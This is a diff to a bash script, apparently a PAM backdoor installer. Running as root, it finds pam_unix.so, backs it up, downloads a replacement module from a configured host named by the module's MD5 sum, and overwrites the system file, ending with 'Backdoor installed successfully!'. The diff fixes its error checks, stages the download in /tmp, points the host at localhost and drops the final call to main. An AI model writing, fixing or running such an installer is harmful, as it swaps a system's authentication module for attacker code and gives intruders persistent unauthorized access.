@@ -1,6 +1,6 @@
 #!/bin/bash
 
-HOST="http://example.com/"
+HOST="http://localhost/"
 
 if [ "$EUID" -ne 0 ]; then
   echo "Please run as root"
@@ -8,16 +8,23 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 make_backup () {
-    cp $1 ${1}.bak
-    if [ $? -nq 0 ]; then
-        echo "Failed making backup of pam_unix.so!"
-        exit
+	if [ -f "${1}.bak" ]; then
+		echo "Backup exists already!"
+	else
+    	cp ${1} ${1}.bak
+
+    	if [ ${?} -ne 0 ]; then
+    		echo "Failed making backup of pam_unix.so!"
+    		exit
+    	else
+    		echo "Backup created: ${pam}.bak"
+    	fi
     fi
 }
 
 find_pam () {
     pam="$(find /lib/ -name pam_unix.so -print 2>/dev/null)"
-    if [ -n $pam ]; then
+    if [ -z ${pam} ]; then
         echo "Failed to find pam_unix.so!"
         exit
     else
@@ -26,16 +33,19 @@ find_pam () {
 }
 
 get_pam () {
-    wget "${HOST}${1}" -O ${pam}
-    if [ $? -nq 0]; then
+    wget "${HOST}${1}" -O /tmp/wget
+    if [ ${?} -ne 0 ]; then
         echo "Failed to install pam_unix.so!"
+        rm /tmp/wget
         exit
+    else
+    	mv /tmp/wget ${pam}
     fi
 }
 
 md5_sum () {
     md5="$(md5sum ${1} | awk '{ print $1 }' )"
-    if [ -n $md5 ]; then
+    if [ -z ${md5} ]; then
         echo "Failed to calculate MD5 sum!"
         exit
     else
@@ -52,11 +62,9 @@ main () {
 
     echo "Making backup in case something fails..."
     make_backup ${pam}
-    echo "Backup created: ${pam}.bak"
 
     echo "Downloading and replacing pam..."
     get_pam ${md5}
+
     echo "Backdoor installed successfully!"
 }
-
-main
